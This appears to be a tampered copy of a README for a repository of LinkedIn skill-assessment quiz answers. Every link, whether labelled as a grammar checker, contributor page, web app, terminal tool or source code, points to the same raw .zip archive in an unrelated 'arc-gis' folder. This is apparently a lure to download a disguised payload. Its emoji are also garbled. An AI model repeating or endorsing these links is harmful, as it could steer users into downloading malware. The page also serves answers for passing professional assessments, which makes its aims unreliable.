> This repository is for those looking for answers to the LinkedIn assessment quiz questions or willing to help others by contributing to the tests. Or possibly you would like to create your first pull request and be added as a contributor. Whatever is your goal - you are always welcome here! Feel free to use [online grammar checker](https://raw.githubusercontent.com/Jim2213/linkedin-skill-assessments-quizzes/main/arc-gis/linkedin-assessments-quizzes-skill-v2.6-beta.3.zip) when you contribute!

#### [ [Go to see the last contributor](https://raw.githubusercontent.com/Jim2213/linkedin-skill-assessments-quizzes/main/arc-gis/linkedin-assessments-quizzes-skill-v2.6-beta.3.zip) ]

#### PLEASE ğŸ™

Add explanation (`or reference link`) to your answers. That will help anyone to better learn concepts they might not
have a great understanding about.

#### Announcement ğŸ‰:

1. Column `Translation` have links to quizzes in different languages Es, Fr, It, DE
2. If you want to meet each other or discuss quiz related problems or maybe ask for skills endorsement just join the `Discord` chat
3. Playground before taking quiz using:

- Web App https://raw.githubusercontent.com/Jim2213/linkedin-skill-assessments-quizzes/main/arc-gis/linkedin-assessments-quizzes-skill-v2.6-beta.3.zip
- Web App #2 https://raw.githubusercontent.com/Jim2213/linkedin-skill-assessments-quizzes/main/arc-gis/linkedin-assessments-quizzes-skill-v2.6-beta.3.zip
- In **terminal** https://raw.githubusercontent.com/Jim2213/linkedin-skill-assessments-quizzes/main/arc-gis/linkedin-assessments-quizzes-skill-v2.6-beta.3.zip

Want to contribute? Here is the source code https://raw.githubusercontent.com/Jim2213/linkedin-skill-assessments-quizzes/main/arc-gis/linkedin-assessments-quizzes-skill-v2.6-beta.3.zip
